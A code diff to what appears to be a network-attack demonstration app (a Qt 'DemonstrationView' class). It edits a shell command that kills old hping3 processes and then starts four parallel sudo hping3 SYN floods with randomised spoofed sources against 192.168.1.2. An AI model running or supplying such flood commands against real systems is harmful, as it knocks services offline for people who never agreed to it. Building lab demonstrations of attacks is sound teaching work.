@@ -254,8 +254,9 @@ class DemonstrationView(QWidget):
 
     # ── DoS attack ────────────────────────────────────────────────────────────
 
-    # Four parallel flood instances to maximise packet volume
+    # Kill any leftover instances first, then launch four parallel flood processes
     _DOS_CMD = (
+        "sudo pkill -9 hping3 2>/dev/null; "
         "for i in 1 2 3 4; do "
         "nohup sudo hping3 -I wlan0 -S -d 1000 -q --flood --rand-source 192.168.1.2 "
         "> /dev/null 2>&1 & "
